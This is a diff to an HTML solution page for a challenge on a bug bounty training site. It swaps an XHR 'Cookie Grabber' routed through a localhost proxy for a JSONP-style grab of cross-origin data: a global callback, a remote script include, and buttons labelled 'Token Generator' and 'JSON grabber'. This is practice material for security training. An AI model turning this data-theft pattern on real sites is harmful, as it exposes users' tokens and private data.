@@ -34,51 +34,22 @@
         </h3>
 
         <script>
-            function testcallback(data) {
-                console.log('Calling back')
-            }
-            function challenge15_cookie(callback) {
-                var xhr1 = new XMLHttpRequest();
-                xhr1.timeout = 10000;
-                let data = {
-                    headers: {
-                        Accept: "application/json",
-                        Origin: "https://www.bugbountytraining.com/"
-                    },
-                    method: 'GET'
-                }
-                xhr1.onreadystatechange = function(e) {
-                    if (xhr1.readyState === 4) {
-                        if (xhr1.status === 200) {
-                            callback(null, xhr1.response);
-                            const headers = xhr1.getAllResponseHeaders();
-                            const arr = headers.trim().split(/[\r\n]+/)
-                            cookie15.innerHTML = arr;
-                        } else {
-                            callback(xhr1.status, null)
-                        }
-                    }
-                }
-                xhr1.ontimeout = function () {
-                    console.log('XHR Timeout')
-                }
-                xhr1.open("POST", "http://localhost:2000/?url=https://www.bugbountytraining.com/challenges/challenge-15login.php", true);              
-                xhr1.setRequestHeader("Content-Type", "application/json");
-                xhr1.send(JSON.stringify(data));
-            }
+            userinfo = function (data) {
+            alert(JSON.stringify(data));
+            };
         </script>
+        <script src="https://www.bugbountytraining.com/challenges/challenge-15.php" type="text/javascript"></script>
 
         <div class="solution">
             <div class="button-box">
                 <span>
                     <form action="" method="">
-                        <input type="button" onclick="challenge15_cookie(testcallback)" value="1. Cookie Grabber" />
+                        <input type="button" onclick="challenge15_grab_token()" value="1. Token Generator" />
                     </form>
-                    <p id="cookie15"></p>
                 </span>
                 <span>
                     <form action="" method="">
-                        <input type="button" onclick="" value="2. Info Stealer" />
+                        <input type="button" onclick="challenge15_grab_sensitive_json()" value="2. JSON grabber" />
                     </form>
                 </span>
             </div>
